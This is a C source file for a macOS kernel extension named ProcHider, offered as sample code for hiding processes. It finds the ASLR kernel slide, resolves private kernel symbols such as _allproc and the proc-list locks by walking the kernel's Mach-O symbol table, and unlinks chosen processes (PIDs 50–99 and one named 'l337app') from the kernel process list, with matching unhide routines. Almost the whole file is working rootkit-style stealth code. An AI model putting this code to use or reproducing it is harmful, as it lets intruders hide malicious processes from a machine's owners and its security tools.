//
//  ProcHider.c
//  Sample code for hiding processes from within a kernel extension.
//  - hide process by name/pid by altering _allproc list...
//

#include "ProcHider.h"

int hidden_p_count = 0;
struct proc *hidden_p[MAX_HIDDEN_PROCESS];

kern_return_t ProcHider_start(kmod_info_t * ki, void *d)
{
    vm_offset_t ASLR = calculate_vm_kernel_slide();
    
    if( ( allproc = (struct proclist *) find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
                "_allproc") ) == NULL )
    {
        DLOG( "[+] Unable to find _allproc!\n" );
        return KERN_FAILURE;
    }
    
    if( ( my_proc_list_lock = ( proc_list_lockp ) find_symbol( (struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR), "_proc_list_lock" ) ) == NULL )
    {
        DLOG( "[+] Unable to find _proc_list_lock!\n" );
        return KERN_FAILURE;
    }
    
    if( ( my_proc_list_unlock = ( proc_list_unlockp ) find_symbol( (struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR), "_proc_list_unlock" ) ) == NULL )
    {
        DLOG( "[+] Unable to find _proc_list_unlock!\n" );
        return KERN_FAILURE;
    }
    
    int i;
    
    for (i=50; i<100; i++) {
        hide_proc_by_pid( i );
    }
    
    hide_proc_by_name( "l337app" );
    
//    DLOG("[+] _allproc @ %p\n",
//         find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
//                     "_allproc"));
//    DLOG("[+] _proc_lock @ %p\n",
//         find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
//                     "_proc_lock"));
//    DLOG("[+] _kauth_cred_setuidgid @ %p\n",
//         find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
//                     "_kauth_cred_setuidgid"));
//    DLOG("[+] __ZN6OSKext13loadFromMkextEjPcjPS0_Pj @ %p\n",
//         find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
//                     "__ZN6OSKext13loadFromMkextEjPcjPS0_Pj"));
    
    return KERN_SUCCESS;
}

kern_return_t ProcHider_stop(kmod_info_t *ki, void *d)
{
    vm_offset_t ASLR = calculate_vm_kernel_slide();
    
    
    if( ( allproc = find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
                                "_allproc") ) == NULL )
    {
        DLOG( "[+] Unable to find _allproc!\n" );
        return KERN_FAILURE;
    }
    
    if( ( my_proc_list_lock = ( proc_list_lockp ) find_symbol( (struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR), "_proc_list_lock" ) ) == NULL )
    {
        DLOG( "[+] Unable to find _proc_list_lock!\n" );
        return KERN_FAILURE;
    }
    
    if( ( my_proc_list_unlock = ( proc_list_unlockp ) find_symbol( (struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR), "_proc_list_unlock" ) ) == NULL )
    {
        DLOG( "[+] Unable to find _proc_list_unlock!\n" );
        return KERN_FAILURE;
    }
    
    int i;
    
    for (i=50; i<100; i++) {
        unhide_proc_by_pid( i );
    }
    
    unhide_proc_by_name( "l337app" );
    
    return KERN_SUCCESS;
}


static int hide_proc_by_pid( int pid )
{
    struct proc *p;
    
    if( pid != 0 )
    {
        for ( p = allproc->lh_first; p != 0; p = p->p_list.le_next )
        {
            if( pid == p->p_pid )
            {
                if( hidden_p_count < MAX_HIDDEN_PROCESS )
                {
                    hidden_p[ hidden_p_count ] = p;
                    hidden_p_count++;
                    my_proc_list_lock();
                    LIST_REMOVE( p, p_list );
                    my_proc_list_unlock();
                }
            }
        }
    }
    
    return 0;
}

static int unhide_proc_by_pid( int pid )
{
    struct proc *p;
    int i;
    if( pid != 0 )
    {
        if( hidden_p_count > 0 )
        {
            for( i = 0; i < hidden_p_count; i++ )
            {
                p = hidden_p[ i ];
                
                if( pid == p->p_pid )
                {
                    my_proc_list_lock();
                    LIST_INSERT_HEAD(allproc, p, p_list);
                    my_proc_list_unlock();
                    hidden_p_count--;
                }
            }
        }
    }
    
    return 0;
}

static int hide_proc_by_name( char *p_comm )
{
    struct proc *p;
    
    for ( p = allproc->lh_first; p != 0; p = p->p_list.le_next )
    {
        if( strncmp( p->p_comm, p_comm, MAXCOMLEN) == 0 )
        {
            if( hidden_p_count < MAX_HIDDEN_PROCESS )
            {
                hidden_p[ hidden_p_count ] = p;
                hidden_p_count++;
                my_proc_list_lock();
                LIST_REMOVE( p, p_list );
                my_proc_list_unlock();
            }
        }
    }
    
    return 0;
}

static int unhide_proc_by_name( char *p_comm )
{
    struct proc *p;
    int i;
 
    if( hidden_p_count > 0 )
    {
        for( i = 0; i < hidden_p_count; i++ )
        {
            p = hidden_p[ i ];
                
            if( strncmp( p->p_comm, p_comm, MAXCOMLEN) == 0 )
            {
                my_proc_list_lock();
                LIST_INSERT_HEAD(allproc, p, p_list);
                my_proc_list_unlock();
                hidden_p_count--;
            }
        }
    }
    
    return 0;
}

struct segment_command_64 *
find_segment_64(struct mach_header_64 *mh, const char *segname)
{
    struct load_command *lc;
    struct segment_command_64 *seg, *foundseg = NULL;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == LC_SEGMENT_64) {
            /* Check load command's segment name */
            seg = (struct segment_command_64 *)lc;
            if (strcmp(seg->segname, segname) == 0) {
                foundseg = seg;
                break;
            }
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the segment (NULL if we didn't find it) */
    return foundseg;
}

struct section_64 *
find_section_64(struct segment_command_64 *seg, const char *name)
{
    struct section_64 *sect, *foundsect = NULL;
    u_int i = 0;
    
    /* First section begins straight after the segment header */
    for (i = 0, sect = (struct section_64 *)((uint64_t)seg + (uint64_t)sizeof(struct segment_command_64));
         i < seg->nsects;
         i++, sect = (struct section_64 *)((uint64_t)sect + sizeof(struct section_64)))
    {
        /* Check section name */
        if (strcmp(sect->sectname, name) == 0) {
            foundsect = sect;
            break;
        }
    }
    
    /* Return the section (NULL if we didn't find it) */
    return foundsect;
}

struct load_command *
find_load_command(struct mach_header_64 *mh, uint32_t cmd)
{
    struct load_command *lc, *foundlc;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == cmd) {
            foundlc = (struct load_command *)lc;
            break;
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the load command (NULL if we didn't find it) */
    return foundlc;
}

void *
find_symbol(struct mach_header_64 *mh, const char *name)
{
    struct symtab_command *msymtab = NULL;
    struct segment_command_64 *mlc = NULL;
    struct segment_command_64 *mlinkedit = NULL;
    void *mstrtab = NULL;
    
    struct nlist_64 *nl = NULL;
    char *str;
    uint64_t i;
    void *addr = NULL;
    
    /*
     * Check header
     */
    if (mh->magic != MH_MAGIC_64) {
        DLOG("FAIL: magic number doesn't match - 0x%x\n", mh->magic);
        return NULL;
    }
    
    /*
     * Find TEXT section
     */
    mlc = find_segment_64(mh, SEG_TEXT);
    if (!mlc) {
        DLOG("FAIL: couldn't find __TEXT\n");
        return NULL;
    }
    
    /*
     * Find the LINKEDIT and SYMTAB sections
     */
    mlinkedit = find_segment_64(mh, SEG_LINKEDIT);
    if (!mlinkedit) {
        DLOG("FAIL: couldn't find __LINKEDIT\n");
        return NULL;
    }
    
    msymtab = (struct symtab_command *)find_load_command(mh, LC_SYMTAB);
    if (!msymtab) {
        DLOG("FAIL: couldn't find SYMTAB\n");
        return NULL;
    }
    
    /*
     * Enumerate symbols until we find the one we're after
     */
    mstrtab = (void *)((int64_t)mlinkedit->vmaddr + (msymtab->stroff - mlinkedit->fileoff));
    for (i = 0, nl = (struct nlist_64 *)(mlinkedit->vmaddr + (msymtab->symoff - mlinkedit->fileoff));
         i < msymtab->nsyms;
         i++, nl = (struct nlist_64 *)((uint64_t)nl + sizeof(struct nlist_64)))
    {
        str = (char *)mstrtab + nl->n_un.n_strx;
        
        if (strcmp(str, name) == 0) {
            addr = (void *)nl->n_value;
        }
    }
    
    /* Return the address (NULL if we didn't find it) */
    return addr;
}

static vm_offset_t calculate_vm_kernel_slide( void )
{
    vm_offset_t kernel_slide = (vm_offset_t)&printf - _PRINTF_ADDR;
    vm_offset_t *actual_slide = (vm_offset_t *) (_VM_KERNEL_SLIDE_ADDR + kernel_slide);
    
    if (*actual_slide == kernel_slide) {
        return kernel_slide;
    }
    
    return 0;
}
